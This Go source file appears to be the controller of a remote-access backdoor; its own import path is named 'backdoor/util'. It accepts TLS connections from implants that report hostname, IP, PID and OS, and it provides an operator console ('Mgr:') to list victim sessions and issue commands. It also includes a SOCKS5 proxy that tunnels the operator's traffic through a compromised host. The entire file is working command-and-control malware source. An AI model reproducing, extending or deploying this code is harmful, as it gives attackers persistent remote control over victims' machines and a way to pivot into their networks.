package main

import (
	"backdoor/util"
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var mutex sync.Mutex
var gs5server *Socks5Server

func GetSocks5Server() *Socks5Server {
	mutex.Lock()
	tmp := gs5server
	mutex.Unlock()
	return tmp
}

func SetSocks5Server(ser *Socks5Server) {
	mutex.Lock()
	gs5server = ser
	mutex.Unlock()
}

func main() {
	client := flag.String("client", "", "client listen address")
	socks5 := flag.String("socks5", "127.0.0.1:1080", "socks5 listen address")
	flag.Parse()
	if len(*client) == 0 || len(*socks5) == 0 {
		flag.Usage()
		return
	}
	clientListen, err := net.Listen("tcp", *client)
	if err != nil {
		fmt.Println(err)
		return
	}
	socks5Listen, err := net.Listen("tcp", *socks5)
	if err != nil {
		fmt.Println(err)
		return
	}
	go socks5Accept(socks5Listen)
	go clientAccept(clientListen)
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("Mgr:")
		if !scanner.Scan() {
			break
		}
		cmd := strings.TrimSpace(scanner.Text())
		if len(cmd) == 0 {
			continue
		}
		strarr := strings.Split(cmd, " ")
		if strarr[0] != "session" {
			fmt.Println("unknown command")
			continue
		}
		if len(strarr) == 1 {
			for _, info := range ginfomgr.All() {
				fmt.Printf("uuid:%s host:%s ip:%s pid:%d time:%s os:%s\n", info.UUID, info.HostName, info.LocalIP, info.PID, info.Time, info.OSType)
			}
		} else {
			session(strarr[1], scanner)
		}
	}
}

func session(uuid string, scanner *bufio.Scanner) {
	if !ginfomgr.Exist(uuid) {
		fmt.Println("uuid is not exist")
		return
	}
	fmt.Printf("waiting %s\n", uuid)
	conn := gwait.Wait(uuid)
	defer conn.Close()
	conn.Write([]byte("OK"))
	fmt.Printf("%s come back\n", uuid)
	pcmd := NewCmdServer(conn)
	psocks := NewSocks5Server(conn)
	SetSocks5Server(psocks)
	go sessionRead(conn, pcmd, psocks)
	go loopHeartBeat(conn)
	pcmd.ProcUI(scanner)
}

func loopHeartBeat(conn *util.SSLConn) {
	for {
		time.Sleep(10 * time.Second)
		_, err := conn.Write(nil)
		if err != nil {
			break
		}
	}
}

func sessionRead(conn *util.SSLConn, pcmd *CmdServer, psocks *Socks5Server) {
	conn.SetReadDeadline(time.Time{})
	for {
		msg, err := conn.Read()
		if err != nil {
			break
		}
		if len(msg) == 0 {
			continue
		}
		if msg[0] == util.CMD_CHANNEL {
			pcmd.OnMsg(msg[1:])
		} else if msg[0] == util.SOCKS5_CHANNEL {
			psocks.OnMsg(msg[1:])
		}
	}
	psocks.OnClose()
	pcmd.OnClose()
}

func clientAccept(clientListen net.Listener) {
	for {
		conn, err := clientListen.Accept()
		if err != nil {
			continue
		}
		go clientRead(util.NewSSLConn(conn))
	}
}

func clientRead(sslconn *util.SSLConn) {
	sslconn.SetReadDeadline(time.Now().Add(20 * time.Second))
	infobytes, err := sslconn.Read()
	if err != nil {
		sslconn.Close()
		return
	}
	pinfo := new(util.Info)
	if err := json.Unmarshal(infobytes, pinfo); err != nil {
		sslconn.Close()
		return
	}
	if len(pinfo.LocalIP) == 0 || len(pinfo.UUID) == 0 {
		sslconn.Close()
		return
	}
	pinfo.Time = time.Now().Format(time.RFC3339)
	ginfomgr.Add(pinfo)
	if gwait.IsNeed(pinfo.UUID, sslconn) {
		return
	}
	sslconn.Close()
}

func socks5Accept(socks5Listen net.Listener) {
	for {
		conn, err := socks5Listen.Accept()
		if err != nil {
			continue
		}
		go socks5Read(util.NewConnWrap(conn))
	}
}

func socks5Read(conn *util.ConnWrap) {
	defer conn.Close()
	var handHead [2]byte
	if _, err := io.ReadFull(conn, handHead[:]); err != nil {
		return
	}
	if handHead[0] != 5 || handHead[1] == 0 {
		return
	}
	handBody := make([]byte, handHead[1])
	if _, err := io.ReadFull(conn, handBody); err != nil {
		return
	}
	conn.Write([]byte{5, 0})
	var reqHead [4]byte
	if _, err := io.ReadFull(conn, reqHead[:]); err != nil {
		return
	}
	if reqHead[0] != 5 || reqHead[1] != 1 || reqHead[2] != 0 {
		return
	}
	if reqHead[3] != 1 && reqHead[3] != 3 {
		return
	}
	var reqBody []byte
	if reqHead[3] == 1 {
		var tmp [6]byte
		if _, err := io.ReadFull(conn, tmp[:]); err != nil {
			return
		}
		reqBody = append(reqBody, 1)
		reqBody = append(reqBody, tmp[:]...)
	} else {
		var length [1]byte
		if _, err := io.ReadFull(conn, length[:]); err != nil {
			return
		}
		if length[0] == 0 {
			return
		}
		tmp := make([]byte, length[0]+2)
		if _, err := io.ReadFull(conn, tmp); err != nil {
			return
		}
		reqBody = append(reqBody, 3, length[0])
		reqBody = append(reqBody, tmp...)
	}
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	pser := GetSocks5Server()
	if pser == nil {
		return
	}
	sid, ok := pser.AddSession(conn)
	if !ok {
		return
	}
	util.SendSocksMsg(pser.conn, util.SOCKS5_CONNECT, sid, reqBody)
	var buffer [1024]byte
	for {
		n, err := conn.Read(buffer[:])
		if err != nil {
			break
		}
		if n == 0 {
			continue
		}
		util.SendSocksMsg(pser.conn, util.SOCKS5_DATA, sid, buffer[:n])
	}
	time.Sleep(20 * time.Second)
	pser.DeleSession(sid)
}
